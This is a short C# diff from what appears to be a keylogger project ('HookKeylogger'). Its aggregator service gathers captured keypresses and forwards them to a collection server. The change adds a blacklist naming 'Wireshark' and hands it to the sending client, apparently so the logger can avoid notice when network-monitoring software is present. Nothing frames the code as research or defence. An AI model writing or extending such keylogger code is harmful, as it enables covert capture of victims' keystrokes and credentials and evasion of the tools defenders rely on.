@@ -2,6 +2,7 @@
 using HookKeylogger.Base;
 using System;
 using System.Collections.Concurrent;
+using System.Collections.Generic;
 using System.Threading;
 
 namespace KeypressAggregator
@@ -21,6 +22,8 @@ namespace KeypressAggregator
             int port = 4567;
             string serveraddr = "localhost";
             int serverport = 13000;
+            var blacklist = new List<string>();
+            blacklist.Add("Wireshark");
 
             // Setup the shared resources
             ConcurrentQueue<KeyPress> inputbuffer = new ConcurrentQueue<KeyPress>();
@@ -30,7 +33,7 @@ namespace KeypressAggregator
                 Services = { HookKeylogger.Base.KerPressAggergator.BindService(new KeyPressAggergatorImpl(inputbuffer)) },
                 Ports = { new Grpc.Core.ServerPort(addr, port, Grpc.Core.ServerCredentials.Insecure) }
             };
-            ServerClient client = new ServerClient(serveraddr, serverport);
+            ServerClient client = new ServerClient(serveraddr, serverport, blacklist.ToArray());
             KeyPressAggergator ksa = new KeyPressAggergator(inputbuffer, client);
             Thread aggergationThread = new Thread(new ThreadStart(ksa.Scan));
             Thread sendThread = new Thread(new ThreadStart(client.Start));
